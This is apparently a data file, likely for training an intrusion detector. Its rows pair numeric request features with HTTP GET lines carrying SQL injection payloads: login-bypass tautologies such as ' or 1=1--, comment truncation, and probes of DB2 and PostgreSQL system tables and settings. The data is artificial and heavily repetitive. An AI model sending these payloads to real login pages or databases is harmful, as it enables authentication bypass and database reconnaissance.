26,1,200,3206,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,2937,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5226,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,4880,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5062,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3884,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,7717,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,2621,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5764,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3680,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3816,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5332,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,1079,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3779,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,4514,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,2250,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5187,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3036,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,5251,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3217,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,2987,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,2276,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
26,1,200,3547,7,4,4,1,1,GET ?id=" or ""=" HTTP/1.1
38,1,200,4653,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,7797,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,5539,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,7637,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,3920,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,4713,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,2632,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,7658,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,5888,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,1803,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,5117,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
31,1,200,6918,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,3301,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,4066,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,3052,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,1571,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,5748,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,6428,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,2760,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,1360,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,6475,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,7948,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,7807,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,7795,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,1378,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,7244,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
31,1,200,3200,7,10,4,2,1,GET login/?id= and 1=1 HTTP/1.1
43,1,200,7732,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,7528,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,6479,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,6328,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,1057,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,6358,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,6377,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,5088,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,5945,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,5452,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,6648,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,5440,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,3094,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,6856,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,3905,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,4587,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,1227,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
43,1,200,7902,7,16,5,2,1,GET login/?id=admin"or 1=1 or ""=" HTTP/1.1
26,1,200,5822,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,1644,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,7217,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,6667,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,6670,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,6856,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,1386,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,7277,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,4919,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,6143,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,1896,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,2654,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,5421,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,7216,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,6221,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,2680,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,1675,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,5374,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,5161,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,2406,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,6104,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
26,1,200,2660,7,4,8,1,1,GET ?id=' or ''-' HTTP/1.1
51,1,200,5716,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2372,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4559,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2413,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1286,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1403,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2527,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,3605,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4795,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1093,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1864,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2957,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4729,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4332,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6526,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6777,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,5755,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,7423,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,1460,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4658,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2627,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,2543,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,6857,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
51,1,200,4507,7,31,5,1,1,GET ?id=select grantee from syscat.dbauth; HTTP/1.1
18,1,200,5093,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2968,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,5084,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,5395,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,4141,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,3766,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,4959,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,6135,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,7228,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2162,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2242,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,7517,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,5286,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2227,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2260,7,2,4,1,1,GET ?id=' HTTP/1.1
81,1,200,1502,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7951,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,3766,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,4111,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,5049,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,6796,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,4685,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,6201,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7991,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,6731,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7895,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,2335,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,7902,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
25,1,200,4602,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,4577,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,1570,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,3363,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,2276,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,3947,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,1493,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,3118,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,5049,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,6034,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,4491,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,3706,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,2720,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,6853,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,1625,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,5306,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,7752,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,1359,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,2132,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,3554,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
25,1,200,7445,7,7,4,2,1,GET ?id=admin"/* HTTP/1.1
38,1,200,6151,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,2366,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,2812,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,3040,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,7606,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,2128,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,1749,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,5383,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,6082,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,6465,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,7827,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,7711,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,2278,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,4323,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,3081,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,1949,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,4299,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
38,1,200,4107,7,11,5,2,1,GET login/?id="or 1=1 or ""=" HTTP/1.1
26,1,200,2656,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6366,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6008,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6957,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,5923,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,1960,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6752,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,5654,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,4139,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,7431,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,1244,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6921,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,3189,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,2065,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,4107,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,1585,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,1227,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,6708,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,7504,7,7,6,2,1,GET login/?id='^' HTTP/1.1
26,1,200,5045,7,7,6,2,1,GET login/?id='^' HTTP/1.1
35,1,200,2901,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,3426,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,5045,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,2114,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,6081,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,4254,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,3540,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,6492,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,6108,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,6965,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,1662,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,2695,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,6728,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,6794,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,2749,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,4335,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,2607,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,2759,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
35,1,200,5325,7,9,5,2,1,GET login/?id=") or "1"="1 HTTP/1.1
33,1,200,7060,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,5019,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3662,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3648,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1660,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4041,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1380,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1343,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3878,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7713,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4863,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6343,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4180,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3322,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2469,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6326,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6775,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7815,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4397,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2383,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,5769,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6052,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3093,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2717,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6438,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,5057,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6698,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2895,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1398,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1517,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,5514,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6941,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1535,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7465,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1010,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3048,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2987,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6011,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,1312,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4795,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7312,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2200,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3309,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7927,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2902,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,6599,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,5745,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4932,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7519,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,4570,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
21,1,200,1129,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,4077,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,5511,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,5954,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,4026,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,3616,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,1638,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,6150,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,1558,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,5967,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,7152,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,6916,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,6326,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,5203,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,6290,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,5091,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,2952,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,4862,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,6371,7,2,5,1,1,GET ?id=" -- HTTP/1.1
21,1,200,6974,7,2,5,1,1,GET ?id=" -- HTTP/1.1
69,1,200,1208,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3455,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,1823,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7460,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3538,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,5214,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4026,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,1580,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7022,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,5647,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,6993,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,5973,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7607,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7932,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,2750,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,1070,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7080,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,1119,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7316,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3766,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4862,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,3772,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,7602,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
69,1,200,4655,7,45,8,2,1,GET login/?id=select current_setting('password_encryption'); HTTP/1.1
25,1,200,3613,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,5657,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,4084,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,2033,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,2980,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,6229,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,1501,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,1976,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,5228,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,5927,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
25,1,200,2918,7,5,4,1,1,GET ?id= and 1=1 HTTP/1.1
